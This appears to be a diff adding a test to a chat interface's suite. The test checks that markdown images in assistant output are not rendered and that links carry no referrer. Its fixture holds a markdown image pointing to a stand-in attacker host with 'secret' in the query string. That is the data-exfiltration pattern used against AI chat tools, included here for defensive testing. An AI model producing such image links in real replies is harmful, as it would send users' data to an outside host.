@@ -38,3 +38,18 @@ describe('Chat composer', () => {
     expect(box.style.height).toBe(`${LINE + PADDING}px`);
   });
 });
+
+describe('Chat markdown', () => {
+  it('never renders remote images from model output, and links leak no referrer', () => {
+    const reply = {
+      id: 'a1', seq: 1, role: 'assistant' as const, compacted: false, createdAt: 'x',
+      parts: [{ type: 'text' as const, text: '![logo](https://evil.example/x.png?d=secret) see [docs](https://example.com)' }],
+    };
+    const { container } = render(<Chat sessionId="s1" initialMessages={[reply]} provider="openai" model="gpt-5-mini" onTurnEnd={() => {}} />);
+    expect(container.querySelector('img')).toBeNull();
+    expect(screen.getByText('[image: logo]')).toBeTruthy();
+    const link = screen.getByRole('link', { name: 'docs' });
+    expect(link.getAttribute('rel')).toBe('noopener noreferrer');
+    expect(link.getAttribute('target')).toBe('_blank');
+  });
+});
